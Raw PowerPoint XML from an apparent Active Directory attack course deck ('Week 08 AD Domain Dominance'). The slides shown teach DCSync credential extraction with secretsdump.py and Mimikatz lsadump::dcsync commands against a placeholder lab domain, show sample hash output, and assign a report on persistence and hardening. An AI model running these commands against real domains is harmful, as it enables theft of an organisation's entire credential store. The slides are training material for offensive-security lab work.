              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>corp.local</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>your_user:Password@DC-IP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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800" dirty="0"/>
              <a:t>💥 Output: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800" dirty="0"/>
              <a:t>Administrator:500:HASH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800" dirty="0"/>
              <a:t>krbtgt:502:HASH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800" dirty="0"/>
              <a:t>user1:1001:HASH</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="18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5CD36E9-1F8E-2EAE-1FED-275E69C7F3CB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5869858" y="133350"/>
            <a:ext cx="6127954" cy="50383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1800" dirty="0"/>
              <a:t>What you are proving in Task 04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800" dirty="0"/>
              <a:t>"I can act like a Domain Controller and extract all user hashes"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1800" dirty="0"/>
              <a:t>What you are proving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1800" dirty="0"/>
              <a:t>You can impersonate a Domain Controller and pull NTDS data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1800" dirty="0"/>
              <a:t>💥 Why </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>NTDS.dit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> is mentioned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1800" dirty="0"/>
              <a:t>👉 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>NTDS.dit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> = database storing all AD credentials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1800" dirty="0"/>
              <a:t>👉 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>DCSync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> = remote way to extract it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1800" dirty="0"/>
              <a:t>Simple mapping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1800" dirty="0" err="1"/>
              <a:t>NTDS.dit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> = database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1800" dirty="0" err="1"/>
              <a:t>DCSync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>   = remote extraction method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4292964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5914103" cy="6690732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1700" dirty="0"/>
              <a:t>Part 2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700" dirty="0"/>
              <a:t> OPTION 1 — Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>Impacket</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> (BEST)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700" dirty="0"/>
              <a:t>📍 WHERE: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700" dirty="0"/>
              <a:t>👉 Kali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700" dirty="0"/>
              <a:t> Command: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700" dirty="0"/>
              <a:t>secretsdump.py </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>corp.local</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>your_user:Password@DC-IP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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700" dirty="0"/>
              <a:t>💥 What this does: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700" dirty="0"/>
              <a:t>Automatically dumps entire NTDS database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700" dirty="0"/>
              <a:t>💀 Output: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700" dirty="0"/>
              <a:t>Administrator:500:HASH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700" dirty="0"/>
              <a:t>krbtgt:502:HASH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700" dirty="0"/>
              <a:t>user1:1001:HASH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700" dirty="0"/>
              <a:t>user2:1002:HASH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700" dirty="0"/>
              <a:t>👉 This =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700" dirty="0"/>
              <a:t>FULL NTDS dump ✔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F5D7E8B-1051-DE2D-0B5A-A8E0C8964636}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6096000" y="0"/>
            <a:ext cx="6120580" cy="3791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1800" dirty="0"/>
              <a:t>OPTION 2 — Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>Mimikatz</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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800" dirty="0"/>
              <a:t>📍 WHERE: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800" dirty="0"/>
              <a:t>👉 Windows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800" dirty="0"/>
              <a:t>Limitation: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800" dirty="0"/>
              <a:t>👉 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>Mimikatz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>DCSync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> is manual per user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800" dirty="0"/>
              <a:t>Example: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800" dirty="0" err="1"/>
              <a:t>lsadump</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>::</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>dcsync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>user:Administrator</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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800" dirty="0" err="1"/>
              <a:t>lsadump</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>::</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>dcsync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>user:krbtgt</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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800" dirty="0" err="1"/>
              <a:t>lsadump</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>::</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>dcsync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> /user:user1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="830176315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33350"/>
            <a:ext cx="4011561" cy="6724650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2000" dirty="0"/>
              <a:t>👉 Not practical for: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US" sz="2000" dirty="0"/>
              <a:t>ALL users ❌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US" sz="2000" dirty="0"/>
              <a:t> So what should YOU use?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US" sz="2000" dirty="0"/>
              <a:t>👉 Use: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US" sz="2000" dirty="0"/>
              <a:t>secretsdump.py ✔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US" sz="2000" dirty="0"/>
              <a:t>Why this satisfies the task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US" sz="2000" dirty="0"/>
              <a:t>Task says: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US" sz="2000" dirty="0"/>
              <a:t>Dump entire </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>NTDS.dit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> database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US" sz="2000" dirty="0"/>
              <a:t>👉 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>secretsdump</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> does exactly: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000" dirty="0"/>
              <a:t>Replicates ALL hashes from AD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000" dirty="0"/>
              <a:t>🔥 Important clarification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6B56CAF-21BB-BE07-3311-852E1157ECEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5112777" y="-105416"/>
            <a:ext cx="6135328" cy="3791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dirty="0"/>
              <a:t>❓ Are you copying </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>NTDS.dit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> file?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dirty="0"/>
              <a:t>👉 ❌ NO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dirty="0"/>
              <a:t>✔ What you are doing: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dirty="0"/>
              <a:t>Extracting its CONTENT remotely (via </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>DCSync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)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dirty="0"/>
              <a:t> Simple analogy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dirty="0" err="1"/>
              <a:t>NTDS.dit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = vault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dirty="0" err="1"/>
              <a:t>DCSync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    = asking vault for all secrets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dirty="0"/>
              <a:t>💀 FINAL RESULT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dirty="0"/>
              <a:t>You now have hashes of entire organization</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4195565049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33350"/>
            <a:ext cx="12192000" cy="6848021"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>Weekly Deliverable: The Domain Dominance Report </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2300" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>Requirement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>: Submit a professional PDF report containing: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>Attack Chain</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>: A step-by-step flow from how you got the first hash (Responder) to how you became Domain Admin (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0" err="1"/>
              <a:t>DCSync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>). </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>Artifact Analysis</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>: Show the forged Golden Ticket and explain how it works. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>Persistence Strategy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>: How would you maintain access if the Admin changes their password? </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>Security Hardening</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>: Provide 3 critical steps to defend against AD attacks (e.g., "Implementing Tiered Administration," "Disabling LLMNR," and "Rotating KRBTGT passwords twice"). </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="404288986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33350"/>
            <a:ext cx="11353800" cy="6043613"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>             </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>                                                  Thank you</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1691257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96B24"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="4EA72E"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="156082"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="0F9ED5"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="A02B93"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="E97132"/>
      </a:accent6>
      <a:hlink>
        <a:srgbClr val="538D9D"/>
      </a:hlink>
      <a:folHlink>
        <a:srgbClr val="A5738E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C0A3E416-13B0-4CFE-8B85-8989D8AEFB5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2429</TotalTime>
  <Words>6052</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>1067</Paragraphs>
  <Slides>64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64</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="74" baseType="lpstr">
      <vt:lpstr>Aptos</vt:lpstr>
      <vt:lpstr>Aptos Display</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Arial Black</vt:lpstr>
      <vt:lpstr>Arial Unicode MS</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Calibri Light</vt:lpstr>
      <vt:lpstr>Google Sans</vt:lpstr>
      <vt:lpstr>Times New Roman</vt:lpstr>
      <vt:lpstr>Office Theme</vt:lpstr>
      <vt:lpstr>Week 8</vt:lpstr>
      <vt:lpstr>Week 08 AD Domain Dominance &amp; Advanced Persistence </vt:lpstr>
      <vt:lpstr>Task 01: LLMNR/NBT-NS Poisoning (The Initial Credential Theft)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Task 02: Exploiting Weak ACLs &amp; GPO Abuse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● Task 03: The Golden &amp; Silver Ticket Attacks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Task 04: DCSync &amp; NTDS.dit Extraction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8</dc:title>
  <dc:creator>Gh0stRift</dc:creator>
  <cp:lastModifiedBy>Gh0stRift</cp:lastModifiedBy>
  <cp:revision>102</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-04-08T10:05:32Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-08-09T16:01:44Z</dcterms:modified>
</cp:coreProperties>
</file>